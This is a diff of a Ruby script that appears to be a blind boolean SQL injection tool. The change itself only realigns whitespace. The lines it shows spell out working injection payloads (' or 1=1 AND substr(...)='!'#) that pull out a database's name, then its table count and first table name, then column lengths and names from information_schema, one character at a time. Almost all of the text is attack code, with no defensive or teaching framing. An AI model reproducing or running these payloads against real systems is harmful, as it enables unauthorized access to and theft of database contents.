@@ -61,16 +61,16 @@ def fetch_name(payload,length)
 end
 
 db[:length]			= count_characters("'  or 1=1 AND length(database()) = ? #")  #Validate the amount of characters of the database
-db[:name]				= fetch_name("'  or 1=1 AND substr(database(),?,1)='!'#",db[:length]) #Validate database name
+db[:name]			= fetch_name("'  or 1=1 AND substr(database(),?,1)='!'#",db[:length]) #Validate database name
 
 table[:count] 			= count_characters("' or 1=1 AND (SELECT COUNT(TABLE_NAME) FROM information_schema.tables WHERE table_schema = '#{db[:name]}') = ? #")
-table[:first_length] 	= count_characters("' or 1=1 AND length((SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema = '#{db[:name]}' LIMIT 1))=? #")
+table[:first_length] 		= count_characters("' or 1=1 AND length((SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema = '#{db[:name]}' LIMIT 1))=? #")
 table[:first_name]		= fetch_name("' or 1=1 AND substr((SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema = '#{db[:name]}' LIMIT 1),?,1) = '!' #",table[:first_length])
 
 column[:count] 			= count_characters("' OR 1=1 AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS where table_schema = '#{db[:name]}' AND table_name = '#{table[:first_name]}') = ? #")
-column[:length][:first]	= count_characters("' or 1=1 AND (SELECT length(COLUMN_NAME) FROM (SELECT column_NAME FROM INFORMATION_SCHEMA.COLUMNS where table_schema = '#{db[:name]}' AND table_name = '#{table[:first_name]}' LIMIT 1 ) as gio) = ? #")
+column[:length][:first]		= count_characters("' or 1=1 AND (SELECT length(COLUMN_NAME) FROM (SELECT column_NAME FROM INFORMATION_SCHEMA.COLUMNS where table_schema = '#{db[:name]}' AND table_name = '#{table[:first_name]}' LIMIT 1 ) as gio) = ? #")
 column[:length][:second]	= count_characters("' or 1=1 AND (SELECT length(COLUMN_NAME) FROM (SELECT column_NAME FROM INFORMATION_SCHEMA.COLUMNS where table_schema = '#{db[:name]}' AND table_name = '#{table[:first_name]}' LIMIT 1 OFFSET 1 ) as gio) = ? #")
-column[:length][:third]	= count_characters("' or 1=1 AND (SELECT length(COLUMN_NAME) FROM (SELECT column_NAME FROM INFORMATION_SCHEMA.COLUMNS where table_schema = '#{db[:name]}' AND table_name = '#{table[:first_name]}' LIMIT 1 OFFSET 2) as gio) = ? #")
+column[:length][:third]		= count_characters("' or 1=1 AND (SELECT length(COLUMN_NAME) FROM (SELECT column_NAME FROM INFORMATION_SCHEMA.COLUMNS where table_schema = '#{db[:name]}' AND table_name = '#{table[:first_name]}' LIMIT 1 OFFSET 2) as gio) = ? #")
 column[:length][:fourth]	= count_characters("' or 1=1 AND (SELECT length(COLUMN_NAME) FROM (SELECT column_NAME FROM INFORMATION_SCHEMA.COLUMNS where table_schema = '#{db[:name]}' AND table_name = '#{table[:first_name]}' LIMIT 1 OFFSET 3) as gio) = ? #")
 column[:name][:first]	= fetch_name("' or 1=1 AND substr((SELECT column_NAME FROM INFORMATION_SCHEMA.COLUMNS where table_schema = '#{db[:name]}' AND table_name = '#{table[:first_name]}' LIMIT 1),?,1) = '!'#",column[:length][:first]) # First column, use 'OFFSET 1' to get the second column and 'OFFSET 2' for the third etc 
 column[:name][:second]	= fetch_name("' or 1=1 AND substr((SELECT column_NAME FROM INFORMATION_SCHEMA.COLUMNS where table_schema = '#{db[:name]}' AND table_name = '#{table[:first_name]}' LIMIT 1 OFFSET 1),?,1) = '!'#",column[:length][:second])  
